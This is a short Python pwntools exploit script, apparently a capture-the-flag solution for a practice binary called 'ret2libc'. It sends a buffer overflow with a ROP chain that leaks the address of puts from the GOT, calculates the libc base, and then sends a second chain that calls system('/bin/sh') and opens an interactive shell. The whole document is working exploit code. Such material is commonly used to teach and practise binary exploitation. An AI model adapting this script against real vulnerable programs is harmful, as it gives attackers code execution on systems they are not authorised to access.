from pwn import *

context.log_level = 'debug'
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF("./ret2libc")
p = process("./ret2libc")
# gdb.attach(p, "b gets")

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
pop_rdi = 0x00000000004011e3

start = 0x0000000000401090
ret = 0x000000000040101a
payload = cyclic(0x78) + p64(ret) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start)
p.sendlineafter(b"RET2LIBC >_<", payload)
p.recvuntil(b"\n")

leak = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leak-0x80e50
success("libc base: " + hex(libc_base))

system = libc_base + libc.sym['system']
str_bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))

payload = cyclic(0x78) + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system)
p.sendlineafter(b"RET2LIBC >_<", payload)

p.interactive()
